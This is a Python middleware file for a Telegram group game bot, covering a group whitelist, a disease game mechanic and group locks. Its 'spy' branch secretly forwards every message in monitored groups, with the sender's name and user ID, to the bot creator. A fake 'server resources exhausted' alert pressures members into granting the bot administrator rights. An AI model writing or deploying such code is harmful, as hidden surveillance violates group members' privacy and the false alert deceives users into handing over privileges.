from typing import Callable, Dict, Any, Awaitable
import time
from aiogram import BaseMiddleware
from aiogram.types import Message, CallbackQuery

from whitelist import get_whitelist, log_unauthorized_chat
from config import CREATOR_ID
from spy import get_spy_chats
from user_manager import get_user_data
from diseases import get_active_diseases
from utils import is_valid_command
from lock_system import get_locked_chats, remove_lock

class WhitelistMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[Message | CallbackQuery, Dict[str, Any]], Awaitable[Any]],
        event: Message | CallbackQuery,
        data: Dict[str, Any]
    ) -> Any:

        chat = event.message.chat if isinstance(event, CallbackQuery) else event.chat

        # Разрешить личные сообщения с ботом (для админа и т.д.)
        if chat.type == "private":
            return await handler(event, data)

        # Логика шпионажа
        spy_chats = await get_spy_chats()

        # Если это сообщение и группа под наблюдением
        if chat.id in spy_chats and isinstance(event, Message) and CREATOR_ID and CREATOR_ID != 0:
            bot = data.get('bot')
            if bot:
                try:
                    # Получаем текст или подпись к медиафайлу
                    text_content = event.html_text or event.caption or ""
                    # Если есть какой-то медиафайл/стикер, помечаем это
                    media_type = ""
                    if event.photo: media_type = "[Фото] "
                    elif event.video: media_type = "[Видео] "
                    elif event.sticker: media_type = "[Стикер] "
                    elif event.voice: media_type = "[Голосовое] "
                    elif event.document: media_type = "[Файл] "


                    forward_info = " [Переслано]" if event.forward_origin else ""
                    reply_info = f" [Ответ на MSG: {event.reply_to_message.message_id}]" if event.reply_to_message else ""

                    if text_content or media_type or forward_info or reply_info:
                        await bot.send_message(
                            chat_id=CREATOR_ID,
                            text=(
                                f"👁 <b>[<code>{chat.id}</code>]</b>\n"
                                f"👤 <b>{event.from_user.full_name}</b> (<code>{event.from_user.id}</code>)\n"
                                f"🆔 MSG: <code>{event.message_id}</code>{forward_info}{reply_info}\n"
                                f"💬 {media_type}{text_content}"
                            )
                        )
                except Exception as e:
                    print(f"Spy Error: {e}")

        whitelist = await get_whitelist()



        if chat.id not in whitelist:
            # Логируем попытку использования
            is_new = await log_unauthorized_chat(chat.id, chat.title or "Unknown")

            # Отправляем уведомление админу, если это новая группа, или если кто-то настойчиво пишет
            if CREATOR_ID and CREATOR_ID != 0 and is_new:
                bot = data.get('bot')
                if bot:
                    try:
                        await bot.send_message(
                            chat_id=CREATOR_ID,
                            text=(
                                f"⚠️ <b>Попытка использования в неразрешенной группе!</b>\n\n"
                                f"Название: <b>{chat.title}</b>\n"
                                f"ID группы: <code>{chat.id}</code>\n\n"
                                f"<i>Чтобы разрешить работу, введите:</i>\n"
                                f"<code>/allow {chat.id}</code>"
                            )
                        )
                    except Exception as e:
                        print(f"Ошибка мидлвари: {e}")

            return

        # Блокировка команд при СПИДе
        user_id = event.from_user.id

        # Оптимизация: определяем, нужно ли нам вообще загружать профиль пользователя
        is_command = False
        if isinstance(event, CallbackQuery):
            is_command = True
        elif isinstance(event, Message):
            text = event.text or event.caption or ""
            if is_valid_command(text) or event.reply_to_message:
                is_command = True

        u_data = None
        if is_command:
            try:
                u_data = await get_user_data(chat.id, user_id, event.from_user.full_name)
                data['u_data'] = u_data

                diseases = u_data.get('diseases') if u_data else None
                if isinstance(diseases, dict) and 'aids' in diseases:
                    active_diseases = await get_active_diseases(chat.id, user_id, u_data=u_data)
                    if 'aids' in active_diseases:
                        # Разрешаем команду зппп
                        if isinstance(event, Message) and event.text and event.text.lower().startswith(('/зппп', '!зппп', 'зппп')):
                            pass
                        else:
                            msg = "🦠 <b>СПИД</b>: Вы в реанимации. Полная блокировка всех команд экономики и игр."
                            if isinstance(event, CallbackQuery):
                                await event.answer(msg, show_alert=True)
                            else:
                                await event.answer(msg)
                            return
            except Exception as e:
                import logging
                logging.getLogger(__name__).exception(f"Error checking user data / AIDS in WhitelistMiddleware: {e}")

        # Проверка блокировки группы через lock_system
        locked_chats = await get_locked_chats()

        if chat.id in locked_chats:
            bot = data.get('bot')

            # Бот все еще не админ, блокируем команды
            if is_command:
                try:
                    # Move the network call inside is_command block to avoid API flood on normal chat messages
                    bot_member = await bot.get_chat_member(chat.id, bot.id)
                    if bot_member.status in ['administrator', 'creator']:
                        # Бот получил админку, автоматически разблокируем
                        await remove_lock(chat.id)
                        try:
                            await bot.send_message(
                                chat_id=chat.id,
                                text="✅ <b>Права администратора подтверждены!</b>\nВсе ресурсы разблокированы. Экономика и мини-игры снова работают в штатном режиме."
                            )
                        except Exception:
                            pass
                        # Let the command go through now that it's unlocked
                        return await handler(event, data)
                except Exception as e:
                    print(f"Ошибка проверки админки: {e}")
                    return

                # Используем локальный кэш для ограничения спама (1 сообщение в 60 сек)
                if not hasattr(self, '_lock_spam_cache'):
                    self._lock_spam_cache = {}

                last_warning = self._lock_spam_cache.get(chat.id, 0)
                current_time = time.time()

                if current_time - last_warning > 60:
                    msg = (
                        "⚠️ <b>КРИТИЧЕСКОЕ УВЕДОМЛЕНИЕ СИСТЕМЫ</b> ⚠️\n\n"
                        "Серверные ресурсы для данной группы исчерпаны. В связи с высокой нагрузкой и для обеспечения бесперебойной работы экономики и мини-игр, боту <b>необходимы права администратора</b> в этом чате.\n\n"
                        "Пожалуйста, выдайте боту права администратора (достаточно базовых), чтобы продолжить использование всех функций без ограничений. Иначе бот перестанет реагировать на команды."
                    )
                    if isinstance(event, CallbackQuery):
                        await event.answer("⚠️ Требуются права администратора!", show_alert=True)
                    else:
                        await event.answer(msg)
                    self._lock_spam_cache[chat.id] = current_time

                return

        return await handler(event, data)